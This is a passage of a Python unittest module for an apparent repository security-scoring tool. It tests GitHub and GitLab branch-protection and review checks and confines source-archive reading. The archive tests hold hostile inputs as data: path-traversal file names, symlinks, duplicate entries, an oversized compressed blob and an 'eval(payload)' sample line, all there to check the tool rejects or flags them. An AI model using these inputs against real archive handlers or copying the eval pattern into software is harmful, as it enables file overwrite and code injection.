        self.assertTrue(all(row["status"] == "unclear" for row in checks))

    def test_host_protection_and_reviews_have_explicit_evidence(self):
        responses = [
            ({"default_branch": "main"}, None),
            ({"protected": True, "commit": {"sha": "a" * 40}}, None),
            (
                {
                    "required_pull_request_reviews": {
                        "required_approving_review_count": 2
                    }
                },
                None,
            ),
        ]
        with mock.patch.object(remote, "json_get", side_effect=responses):
            settings, revision, archive = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        self.assertEqual([row["status"] for row in settings[:2]], ["set", "set"])
        self.assertEqual(revision, "a" * 40)
        self.assertTrue(archive.endswith("a" * 40))

    def test_gitlab_only_credits_reviews_for_the_selected_branch(self):
        project = {
            "default_branch": "main",
            "only_allow_merge_if_pipeline_succeeds": True,
        }
        branch = {"protected": True, "commit": {"id": "b" * 40}}
        rules = [
            {
                "approvals_required": 2,
                "protected_branches": [{"name": "main"}],
                "eligible_approvers": [{"name": "PRIVATE_PERSON_MARKER"}],
            }
        ]
        with mock.patch.object(
            remote,
            "json_get",
            side_effect=[(project, None), (branch, None), (rules, None)],
        ):
            settings, revision, archive = remote.host_settings(
                "gitlab.com", "group/project", sources.Budget(), "isolated-test-value"
            )
        self.assertEqual(
            next(
                row["status"]
                for row in settings
                if row["setting"] == "required_reviews"
            ),
            "set",
        )
        self.assertNotIn("PRIVATE_PERSON_MARKER", json.dumps(settings))
        self.assertEqual(revision, "b" * 40)
        rules[0]["protected_branches"][0]["name"] = "other"
        with mock.patch.object(
            remote,
            "json_get",
            side_effect=[(project, None), (branch, None), (rules, None)],
        ):
            settings, _, _ = remote.host_settings(
                "gitlab.com", "group/project", sources.Budget(), "isolated-test-value"
            )
        self.assertEqual(
            next(
                row["status"]
                for row in settings
                if row["setting"] == "required_reviews"
            ),
            "unknown",
        )

    def test_url_runtime_reads_pinned_source_and_settings(self):
        data = self.archive(
            [("root/app.py", b"requests.get(url, verify=True)\n", tarfile.REGTYPE)]
        )
        settings = [
            remote.setting("default_branch_protection", False),
            remote.setting("required_reviews", None),
        ]
        output = io.StringIO()
        with (
            mock.patch.object(
                remote,
                "host_settings",
                return_value=(
                    settings,
                    "a" * 40,
                    "https://api.github.com/repos/example/project/tarball/" + "a" * 40,
                ),
            ),
            mock.patch.object(remote, "get", return_value=(data, 200)),
            contextlib.redirect_stdout(output),
        ):
            status = cli.main(["https://github.com/example/project.git", "--json"])
        result = json.loads(output.getvalue())
        self.assertEqual(status, 0)
        self.assertEqual(result["scope"]["revision"], "a" * 40)
        self.assertEqual(result["scope"]["selection"], "git-url")
        self.assertEqual(result["host_settings"], settings)
        self.assertEqual(result["score"], 79)
        self.assertEqual(result["grade"], "C")

    def test_host_controls_alone_cannot_award_a_source_score(self):
        data = self.archive([("root/app.java", b"class App {}", tarfile.REGTYPE)])
        output = io.StringIO()
        with (
            mock.patch.object(
                remote,
                "host_settings",
                return_value=(
                    [remote.setting("default_branch_protection", True)],
                    "a" * 40,
                    "https://api.github.com/archive",
                ),
            ),
            mock.patch.object(remote, "get", return_value=(data, 200)),
            contextlib.redirect_stdout(output),
        ):
            status = cli.main(["https://github.com/example/project", "--json"])
        self.assertEqual(status, 2)
        self.assertIsNone(json.loads(output.getvalue())["grade"])

    def test_archive_is_not_extracted_and_paths_are_confined(self):
        data = self.archive([("root/app.py", b"eval(payload)\n", tarfile.REGTYPE)])
        files, exclusions = remote.archive_files(data, sources.Budget())
        self.assertEqual(files["app.py"]["text"], "eval(payload)\n")
        self.assertEqual(exclusions, [])
        for path in ("root/../../outside.py", "/root/app.py", "root/C:\\outside.py"):
            with self.subTest(path=path), self.assertRaises(sources.SourceError):
                remote.archive_files(
                    self.archive([(path, b"x", tarfile.REGTYPE)]), sources.Budget()
                )

    def test_archive_links_duplicates_and_expansion_limits(self):
        _, exclusions = remote.archive_files(
            self.archive([("root/app.py", b"", tarfile.SYMTYPE)]), sources.Budget()
        )
        self.assertEqual(exclusions[0]["reason"], "link or submodule")
        data = self.archive(
            [
                ("root/app.py", b"a", tarfile.REGTYPE),
                ("root/app.py", b"b", tarfile.REGTYPE),
            ]
        )
        with self.assertRaises(sources.SourceError):
            remote.archive_files(data, sources.Budget())
        with mock.patch.object(remote, "MAX_BYTES", -8 * 1024 * 1024 + 100):
            with self.assertRaises(sources.SourceError):
                remote.archive_files(gzip.compress(b"x" * 101), sources.Budget())


if __name__ == "__main__":
    unittest.main()
